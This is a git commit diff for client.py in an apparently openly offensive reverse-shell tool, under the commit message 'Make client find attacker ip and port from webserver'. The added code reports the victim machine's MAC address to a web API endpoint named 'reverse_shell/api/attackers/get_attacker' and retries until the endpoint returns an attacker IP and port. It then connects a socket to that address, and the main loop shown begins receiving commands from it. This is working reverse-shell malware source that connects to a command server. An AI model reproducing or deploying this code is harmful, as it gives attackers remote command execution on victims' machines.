793e11f643a7cd95858b9ac27af63fd350825305
Daniel Eidlin <daniel.eidlin@gmail.com>
2020-03-01 21:08:23 +0200

    Make client find attacker ip and port from webserver

--- client.py
+++ client.py
@@ -1,20 +1,40 @@
-import socket
-import os
+import json
 import subprocess
+import requests
+import socket
+import uuid
 import sys
+import re
+import os
 
 
 class Client(object):
 
     def __init__(self):
-        self.target_host = '127.0.0.1'
-        self.target_port = 4444
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.client.connect((self.target_host, self.target_port))
         # Change directory to 'Desktop'.
         # os.chdir(os.path.join(os.environ["HOMEPATH"], "Desktop")) #TODO Fix this.
 
+    @staticmethod
+    def get_mac_address():
+        # joins elements of getnode() after each 2 digits.
+        # using regex expression
+        return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+
+    def connect_to_attacker(self):
+        mac_address = self.get_mac_address()
+        response = requests.get(
+            f'http://127.0.0.1:8000/reverse_shell/api/attackers/get_attacker/?mac_address={mac_address}')
+        while response.status_code != 200:
+            response = requests.get(
+                f'http://127.0.0.1:8000/reverse_shell/api/attackers/get_attacker/?mac_address={mac_address}')
+        attacker = json.loads(response.text)
+        attacker_ip = attacker['ip']
+        attacker_port = attacker['port']
+        self.client.connect((attacker_ip, attacker_port))
+
     def main(self):
+        self.connect_to_attacker()
         while True:
             data = self.client.recv(1024).decode('utf-8')
             if data == 'quit':
